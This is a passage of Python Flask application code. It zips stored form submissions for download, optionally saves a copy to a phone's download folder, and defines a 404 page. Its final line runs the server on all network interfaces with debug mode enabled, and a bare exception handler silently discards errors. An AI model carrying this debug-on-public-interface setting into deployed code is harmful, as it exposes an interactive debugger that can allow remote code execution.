        subs_data = [{"time": s.created_at.isoformat(), "data": json.loads(s.data)} for s in subs]
        z.writestr("_submissions.json", json.dumps(subs_data, indent=2))
    buf.seek(0)
    dl = phone_download_dir()
    if dl:
        try:
            with open(os.path.join(dl, f"{repo.slug}.zip"), "wb") as fh:
                fh.write(buf.getvalue())
            buf.seek(0)
        except Exception:
            pass
    return send_file(buf, mimetype="application/zip",
                     as_attachment=True, download_name=f"{repo.slug}.zip")

@app.errorhandler(404)
def nf(e): return page("Not found", '<div class="card"><h2>404 — Not found</h2></div>', noindex=True), 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
